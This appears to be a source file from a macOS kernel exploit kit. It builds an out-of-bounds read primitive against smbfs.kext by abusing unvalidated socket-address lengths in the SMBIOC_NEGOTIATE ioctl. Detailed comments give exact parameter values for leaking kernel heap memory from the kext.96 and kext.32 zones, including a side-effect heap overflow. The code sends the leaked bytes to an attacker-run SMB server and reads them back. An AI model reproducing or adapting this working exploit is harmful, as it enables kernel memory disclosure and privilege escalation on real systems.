//
//  zkext_neighbor_reader_xs.c
//  kmem_xepg
//
//  Created by admin on 1/3/22.
//

#include <assert.h>
#include <stdlib.h>
#include <stdatomic.h>

#include <sys/errno.h>
#include <dispatch/dispatch.h>

#include <xpl/util/assert.h>
#include <xpl_smbx/smbx_conf.h>

#include "../smb/client.h"

#include "oob_reader_base.h"

///
/// This OOB reader uses the vulnerabilities demonstrated in `poc_sockaddr_oob_read`,
/// `poc_snb_name_oob_read` and `poc_oob_write` to achieve OOB read on zones in
/// `KHEAP_KEXT` with element size upto 128 bytes.
///
/// As discussed in the `poc_sockaddr_oob_read`, the `SMBIOC_NEGOTIATE` ioctl will first copy
/// in the socket address (server and local socket address) from user memory. The members
/// `ioc_saddr`, `ioc_saddr_len`, `ioc_laddr` and `ioc_laddr_len` in the ioctl request data is used
/// to provide the location and size of user memory containing the server and local socket address
/// to `smbfs.kext`. The kext will first use `smb_memdupin` method to copy this address from
/// user land to a zone in `KHEAP_KEXT` (determined by `ioc_saddr_len` or `ioc_laddr_len`).
/// This copied in values are assigned to `iod->iod_saddr` and `iod->iod_laddr` of the main iod
/// associated with the smb session without validating the `sa_len` field of these socket addresses.
/// This allows us to provide a socket address with `sa_len` field larger than the size of memory
/// allocated for the socket address (`ioc_saddr_len` or `ioc_laddr_len`). Any subsequent use of
/// these copied in socket address may lead to OOB read from corresponding zone in
/// `KHEAP_KEXT`.
///
/// If the socket address family of server socket address is `AF_NETBIOS`, before sending the
/// SMB negotiate request to SMB server, a netbios session must be setup. For this the socket
/// addresses `iod->iod_saddr` and `iod->iod_laddr` is duplicated using `smb_dup_sockaddr`
/// method and then the netbios names of the duplicated addresses are sent to SMB server using
/// `nbssn_rq_request` method.
///
/// As discussed in the `poc_oob_write`, the method `smb_dup_sockaddr` used for duplicating
/// socket address in the kext will allocate the memory for duplicated socket address in `default.64`
/// zone and then it uses `bcopy` to copy memory of size `sa_len` from source socket address to
/// duplicated socket address memory. The `sa_len` field is not validated and its size can be greater
/// than 64 which could lead to OOB write in `default.64` zone.
///
/// Also as discussed in the `poc_snb_name_oob_read`, the method `nb_put_name` used to add
/// the netbios name to request data will ignore the size of `snb_name` field and it will copy the
/// netbios name from socket address to request data until it encounters a segment with no data,
/// which could lead to OOB read in `default.64` zone. The request data is sent to SMB server
/// to setup netbios session
///
/// By adjusting the values of ioc address length, socket address length and netbios name, we
/// can get OOB read from any zone with size less than 128 bytes in `KHEAP_KEXT`
///
/// Example 1: OOB read from `kext.96` zone
/// This can be done by setting `ioc_saddr_len` to `96`, `saddr->sa_len` to `96 * 2` and
/// `saddr->snb_name[0] = 96 - offsetof(struct sockaddr_nb, snb_name) + 96 - 1`. This will lead
/// to `iod->iod_saddr` being allocated on kext.96 zone. The `smb_dup_sockaddr` method will
/// allocate memory for duplicated socket address from default.64 zone and copies `96 * 2` bytes
/// from `iod->iod_saddr` to duplicated socket address, triggering the OOB read of 96 bytes from
/// kext.96 zone and OOB write of 128 bytes in default.64 zone. Then the `nb_put_name` method
/// will copy atleast `saddr->snb_name[0] + 1` bytes of data from the duplicated socket address
/// to the netbios request sent to SMB server. The `offsetof(struct sockaddr_nb, snb_name)` is
/// 20 bytes, which means atleast 172 bytes of data will sent to SMB server as server netbios
/// name. Of this 172 bytes, the first 76 bytes came from memory allocated for `iod->iod_saddr`
/// and the reset 96 bytes came from the succeeding zone element of `iod->iod_saddr` in kext.96
/// zone. NOTE: since OOB write occurs in default.64 zone, care must be taken to make sure the
/// OOB write will not eventually trigger kernel panic. See xpl_oob_reader_ovf.c for using this
/// method to achieve OOB read in zones on `KHEAP_KEXT` with size greater than 32
///
/// Example 2: OOB read from `kext.32` zone
/// For this the values are `ioc_saddr_len = 32`, `saddr->sa_len = 64` and
/// `saddr->snb_name[0] = 75`. The main difference from previous example is that there will be
/// no OOB write in default.64 zone because `saddr->sa_len <= 64` bytes
///


struct xpl_oob_reader_base {
    int fd_snb_name_client;
    int fd_kmem_reader;
    _Atomic uint32_t keygen;
};

static dispatch_once_t g_kmem_oob_reader_token;
static struct xpl_oob_reader_base* g_kmem_oob_reader;


struct xpl_oob_reader_base* xpl_oob_reader_base_create(const struct sockaddr_in* smb_addr) {
    struct xpl_oob_reader_base* reader = malloc(sizeof(struct xpl_oob_reader_base));
    
    /// SMB device used to execute `SMBIOC_NEGOTIATE` ioctl request for OOB read
    reader->fd_kmem_reader = smb_client_open_dev();
    xpl_assert_cond(reader->fd_kmem_reader, >=, 0);
    
    /// SMB device for reading saved server and local netbios name from server.
    /// This device should be connected to a SMB share for executing custom SMB
    /// commands using `SMBIOC_REQUEST` ioctl
    reader->fd_snb_name_client = smb_client_open_dev();
    xpl_assert_cond(reader->fd_snb_name_client, >=, 0);
    int error = smb_client_ioc_negotiate(reader->fd_snb_name_client, smb_addr, sizeof(*smb_addr), FALSE);
    xpl_assert_err(error);
    error = smb_client_ioc_tcon(reader->fd_snb_name_client, "default");
    xpl_assert_err(error);
    
    return reader;
}

void xpl_oob_reader_base_read(const struct xpl_oob_reader_base_args* args, char* server_nb_name, uint32_t* server_nb_name_size, char* local_nb_name, uint32_t* local_nb_name_size) {
    
    dispatch_once(&g_kmem_oob_reader_token, ^{
        g_kmem_oob_reader = xpl_oob_reader_base_create(&args->smb_addr);
    });
    
    /// If the segment data length is 255, an infinite for loop will be created in `nb_put_name`
    /// due to integer overflow (Line: `seglen = (*cp) + 1`)
    xpl_assert(args->saddr_snb_name_seglen != 0xff);
    xpl_assert(args->laddr_snb_name_seglen != 0xff);
    
    /// Make sure the local netbios socket address is large enough to hold the command
    /// `struct xpl_smbx_nb_laddr_cmd`
    xpl_assert_cond(args->laddr_ioc_len, >=, offsetof(struct sockaddr_nb, snb_name) + sizeof(struct xpl_smbx_nb_laddr_cmd) + 1);
    
    struct sockaddr_nb saddr;
    struct sockaddr_nb laddr;
    
    bzero(&saddr, sizeof(saddr));
    bzero(&laddr, sizeof(laddr));
    
    saddr.snb_family = AF_NETBIOS;
    saddr.snb_addrin = args->smb_addr;
    saddr.snb_len = args->saddr_snb_len;
    saddr.snb_name[0] = args->saddr_snb_name_seglen;
    
    laddr.snb_family = AF_NETBIOS;
    laddr.snb_len = args->laddr_snb_len;
    laddr.snb_name[0] = args->laddr_snb_name_seglen;
    
    static_assert(sizeof(laddr.snb_name) >= sizeof(struct xpl_smbx_nb_laddr_cmd) + 1, "");
    
    /// Embed custom instructions for xpl_smbx server. See
    /// `RequestHandler::handleNetbiosSsnRequest` method in xpl_smbx/main.swift
    struct xpl_smbx_nb_laddr_cmd* cmd_paddr = (struct xpl_smbx_nb_laddr_cmd*)&laddr.snb_name[1];
    cmd_paddr->magic = xpl_SMBX_NB_LADDR_CMD_MAGIC;
    /// Generate a unique key for this request. This key can then be used to retrieve the
    /// local and server netbios name sent to the server (which will contain the OOB read data)
    cmd_paddr->key = atomic_fetch_add(&g_kmem_oob_reader->keygen, 1);
    /// Tell xpl_smbx server to save the received server and local netbios name
    cmd_paddr->flags = xpl_SMBX_NB_LADDR_CMD_FLAG_SAVE;
    /// Tell xpl_smbx server to respond with `NB_SSN_NEGRESP` response code whiich will
    /// lead to failure of `SMBIOC_NEGOTIATE` ioctl syscall. This will allow us to reuse the
    /// `g_kmem_oob_reader->fd_kmem_reader` without having to close and open an new
    /// SMB device (`SMBIOC_NEGOTIATE` ioctl command is used to create a new smb
    /// session and after one successfull execution of this command on a smb device, the
    /// subsequent attempts to execute this command will fail with error `EISCONN`)
    cmd_paddr->flags |= xpl_SMBX_NB_LADDR_CMD_FLAG_FAIL;
    
    /// Execute the `SMBIOC_NEGOTIATE` leading to OOB read data being sent to xpl_smbx
    /// server
    int error = smb_client_ioc_negotiate_nb(g_kmem_oob_reader->fd_kmem_reader, &saddr, args->saddr_ioc_len, &laddr, args->laddr_ioc_len);
    xpl_assert_cond(error, ==, ECONNABORTED);
    
    /// Read the local and server netbios names sent to xpl_smbx server which will be containing
    /// the OOB read data
    error = smb_client_ioc_read_saved_nb_ssn_request(g_kmem_oob_reader->fd_snb_name_client, cmd_paddr->key, server_nb_name, server_nb_name_size, local_nb_name, local_nb_name_size);
    xpl_assert_err(error);
}

